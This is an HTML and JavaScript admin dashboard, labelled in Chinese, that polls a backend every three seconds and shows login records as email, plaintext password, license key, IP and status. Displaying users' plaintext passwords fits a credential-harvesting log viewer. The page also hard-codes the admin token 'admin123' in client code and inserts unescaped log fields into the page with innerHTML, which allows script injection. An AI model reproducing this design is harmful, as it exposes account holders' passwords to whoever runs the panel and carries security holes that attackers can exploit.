<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>季伯常系统 - 实时监控面板</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --success: #4cc9f0;
            --danger: #f72585;
            --warning: #f8961e;
            --dark: #1a1a2e;
            --light: #f8f9fa;
            --gray: #6c757d;
        }

        body {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 12px;
            padding: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .header h1 {
            font-size: 32px;
            color: var(--success);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .connection-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 20px;
            border-radius: 20px;
            font-size: 14px;
        }

        .status-connected {
            background: rgba(76, 201, 240, 0.2);
            color: var(--success);
        }

        .status-disconnected {
            background: rgba(247, 37, 133, 0.2);
            color: var(--danger);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        .connected .status-dot {
            background: var(--success);
        }

        .disconnected .status-dot {
            background: var(--danger);
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }

        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: var(--primary);
            color: white;
        }

        .btn-primary:hover {
            background: var(--secondary);
        }

        .btn-danger {
            background: var(--danger);
            color: white;
        }

        .btn-success {
            background: var(--success);
            color: white;
        }

        .table-container {
            overflow-x: auto;
            border-radius: 8px;
            max-height: 600px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.3);
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        th, td {
            padding: 15px 12px;
            text-align: left;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        th {
            background: rgba(0, 0, 0, 0.5);
            color: var(--success);
            font-weight: 600;
            text-transform: uppercase;
            font-size: 13px;
            letter-spacing: 1px;
            position: sticky;
            top: 0;
        }

        tr:hover {
            background: rgba(255, 255, 255, 0.03);
        }

        .new-log {
            background: rgba(76, 201, 240, 0.1) !important;
            animation: highlight 3s ease;
        }

        @keyframes highlight {
            0% { background: rgba(76, 201, 240, 0.3); }
            100% { background: rgba(76, 201, 240, 0.1); }
        }

        .badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .badge-success {
            background: rgba(76, 201, 240, 0.2);
            color: var(--success);
        }

        .badge-danger {
            background: rgba(247, 37, 133, 0.2);
            color: var(--danger);
        }

        .real-time-indicator {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            color: var(--success);
            margin-bottom: 15px;
        }

        .pulse {
            width: 8px;
            height: 8px;
            background: var(--success);
            border-radius: 50%;
            animation: pulse 1.5s infinite;
        }

        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            background: var(--success);
            color: white;
            border-radius: 8px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
            z-index: 1001;
            transform: translateX(400px);
            transition: transform 0.3s ease;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification.error {
            background: var(--danger);
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.05);
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: var(--success);
            margin: 5px 0;
        }

        .stat-label {
            font-size: 12px;
            color: var(--gray);
            text-transform: uppercase;
        }

        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid var(--success);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- 通知 -->
    <div id="notification" class="notification">
        <i class="fas fa-bell"></i>
        <span id="notificationText">新登录事件</span>
    </div>

    <div class="container">
        <div class="header">
            <h1><i class="fas fa-crown"></i> 季伯常 - 实时登录监控</h1>
            <div class="connection-status" id="connectionStatus">
                <div class="status-dot"></div>
                <span>连接中...</span>
            </div>
        </div>

        <div class="stats">
            <div class="stat-card">
                <div class="stat-value" id="totalLogs">0</div>
                <div class="stat-label">总登录记录</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="successLogs">0</div>
                <div class="stat-label">成功登录</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="failedLogs">0</div>
                <div class="stat-label">失败登录</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="todayLogs">0</div>
                <div class="stat-label">今日登录</div>
            </div>
        </div>

        <div class="controls">
            <button class="btn btn-primary" id="startMonitor">
                <i class="fas fa-play"></i>
                <span>开始监控</span>
            </button>
            <button class="btn btn-danger" id="stopMonitor" disabled>
                <i class="fas fa-stop"></i>
                <span>停止监控</span>
            </button>
            <button class="btn btn-success" id="refreshLogs">
                <i class="fas fa-sync-alt"></i>
                <span>刷新日志</span>
            </button>
            <button class="btn btn-primary" id="clearLogs">
                <i class="fas fa-trash"></i>
                <span>清空日志</span>
            </button>
            <div class="real-time-indicator">
                <div class="pulse"></div>
                <span>实时监控状态: <span id="monitorStatus">未启动</span></span>
            </div>
        </div>

        <div class="table-container">
            <table>
                <thead>
                    <tr>
                        <th>时间</th>
                        <th>IP地址</th>
                        <th>邮箱账号</th>
                        <th>密码</th>
                        <th>卡密</th>
                        <th>状态</th>
                        <th>登录信息</th>
                    </tr>
                </thead>
                <tbody id="loginLogsTable">
                    <tr>
                        <td colspan="7" style="text-align: center; padding: 40px;">
                            <i class="fas fa-info-circle" style="font-size: 48px; color: var(--gray); margin-bottom: 15px; display: block;"></i>
                            <p>点击"开始监控"按钮启动实时登录监控</p>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <script>
        class RealLoginMonitor {
            constructor() {
                this.isMonitoring = false;
                this.intervalId = null;
                this.loginLogs = [];
                this.stats = {
                    total: 0,
                    success: 0,
                    failed: 0,
                    today: 0
                };
                this.apiBase = '/api'; // 根据您的后端API地址调整
            }

            async startMonitoring() {
                if (this.isMonitoring) return;
                
                this.isMonitoring = true;
                this.updateMonitorStatus('监控中...');
                this.showNotification('开始实时监控登录日志', 'success');
                
                // 先加载现有日志
                await this.fetchLoginLogs();
                
                // 设置定时器每3秒获取一次最新日志
                this.intervalId = setInterval(async () => {
                    await this.fetchLoginLogs(true);
                }, 3000);
                
                this.updateButtonStates();
            }

            stopMonitoring() {
                if (!this.isMonitoring) return;
                
                this.isMonitoring = false;
                if (this.intervalId) {
                    clearInterval(this.intervalId);
                    this.intervalId = null;
                }
                
                this.updateMonitorStatus('已停止');
                this.showNotification('已停止实时监控', 'error');
                this.updateButtonStates();
            }

            async fetchLoginLogs(isIncremental = false) {
                try {
                    // 调用真实的后端API获取登录日志
                    const response = await fetch(`${this.apiBase}/admin/login-logs?limit=100`, {
                        headers: {
                            'x-admin-token': 'admin123' // 使用您的管理员令牌
                        }
                    });

                    if (!response.ok) {
                        throw new Error(`API请求失败: ${response.status}`);
                    }

                    const data = await response.json();
                    
                    if (data.success) {
                        await this.processLogs(data.data, isIncremental);
                    } else {
                        throw new Error(data.message || '获取日志失败');
                    }
                    
                    this.updateConnectionStatus(true);
                } catch (error) {
                    console.error('获取登录日志失败:', error);
                    this.updateConnectionStatus(false);
                    this.showNotification(`获取日志失败: ${error.message}`, 'error');
                }
            }

            async processLogs(newLogs, isIncremental) {
                if (!Array.isArray(newLogs)) return;

                let newCount = 0;
                
                // 如果是增量更新，只添加新日志
                if (isIncremental && this.loginLogs.length > 0) {
                    const lastLogId = this.loginLogs[0].id;
                    const newLogsOnly = newLogs.filter(log => log.id > lastLogId);
                    
                    if (newLogsOnly.length > 0) {
                        this.loginLogs = [...newLogsOnly, ...this.loginLogs];
                        newCount = newLogsOnly.length;
                        
                        // 显示新登录通知
                        newLogsOnly.forEach(log => {
                            if (log.success) {
                                this.showNotification(`新登录: ${log.email}`, 'success');
                            } else {
                                this.showNotification(`登录失败: ${log.email}`, 'error');
                            }
                        });
                    }
                } else {
                    // 全量更新
                    this.loginLogs = newLogs;
                    newCount = newLogs.length;
                }

                // 更新统计信息
                this.updateStats();
                
                // 更新表格显示
                this.updateLogsTable();
                
                if (isIncremental && newCount > 0) {
                    console.log(`新增 ${newCount} 条登录记录`);
                }
            }

            updateLogsTable() {
                const tableBody = document.getElementById('loginLogsTable');
                
                if (this.loginLogs.length === 0) {
                    tableBody.innerHTML = `
                        <tr>
                            <td colspan="7" style="text-align: center; padding: 40px;">
                                <i class="fas fa-info-circle" style="font-size: 48px; color: var(--gray); margin-bottom: 15px; display: block;"></i>
                                <p>暂无登录记录</p>
                            </td>
                        </tr>
                    `;
                    return;
                }

                tableBody.innerHTML = this.loginLogs.map((log, index) => `
                    <tr class="${index === 0 ? 'new-log' : ''}">
                        <td>${this.formatTimestamp(log.timestamp)}</td>
                        <td>${log.ip || '未知'}</td>
                        <td><strong>${log.email}</strong></td>
                        <td><code>${log.password}</code></td>
                        <td>${log.licenseKey || '未知'}</td>
                        <td>
                            <span class="badge ${log.success ? 'badge-success' : 'badge-danger'}">
                                ${log.success ? '成功' : '失败'}
                            </span>
                        </td>
                        <td>${log.message || ''}</td>
                    </tr>
                `).join('');
            }

            updateStats() {
                const now = new Date();
                const today = now.toDateString();
                
                this.stats.total = this.loginLogs.length;
                this.stats.success = this.loginLogs.filter(log => log.success).length;
                this.stats.failed = this.loginLogs.filter(log => !log.success).length;
                this.stats.today = this.loginLogs.filter(log => 
                    new Date(log.timestamp).toDateString() === today
                ).length;

                document.getElementById('totalLogs').textContent = this.stats.total;
                document.getElementById('successLogs').textContent = this.stats.success;
                document.getElementById('failedLogs').textContent = this.stats.failed;
                document.getElementById('todayLogs').textContent = this.stats.today;
            }

            formatTimestamp(timestamp) {
                const date = new Date(timestamp);
                return date.toLocaleString('zh-CN');
            }

            updateConnectionStatus(connected) {
                const statusElement = document.getElementById('connectionStatus');
                if (connected) {
                    statusElement.innerHTML = '<div class="status-dot"></div><span>已连接</span>';
                    statusElement.className = 'connection-status status-connected connected';
                } else {
                    statusElement.innerHTML = '<div class="status-dot"></div><span>连接断开</span>';
                    statusElement.className = 'connection-status status-disconnected disconnected';
                }
            }

            updateMonitorStatus(status) {
                document.getElementById('monitorStatus').textContent = status;
            }

            updateButtonStates() {
                document.getElementById('startMonitor').disabled = this.isMonitoring;
                document.getElementById('stopMonitor').disabled = !this.isMonitoring;
            }

            showNotification(message, type = 'success') {
                const notification = document.getElementById('notification');
                const text = document.getElementById('notificationText');
                
                text.textContent = message;
                notification.className = `notification ${type === 'error' ? 'error' : ''}`;
                notification.classList.add('show');

                setTimeout(() => {
                    notification.classList.remove('show');
                }, 3000);
            }

            clearLogs() {
                this.loginLogs = [];
                this.updateLogsTable();
                this.updateStats();
                this.showNotification('日志显示已清空', 'success');
            }
        }

        // 初始化监控系统
        const monitor = new RealLoginMonitor();

        // 事件监听
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('startMonitor').addEventListener('click', function() {
                monitor.startMonitoring();
            });

            document.getElementById('stopMonitor').addEventListener('click', function() {
                monitor.stopMonitoring();
            });

            document.getElementById('refreshLogs').addEventListener('click', function() {
                monitor.fetchLoginLogs();
                monitor.showNotification('手动刷新日志', 'success');
            });

            document.getElementById('clearLogs').addEventListener('click', function() {
                if (confirm('确定要清空显示的日志吗？')) {
                    monitor.clearLogs();
                }
            });
        });
    </script>
</body>
</html>
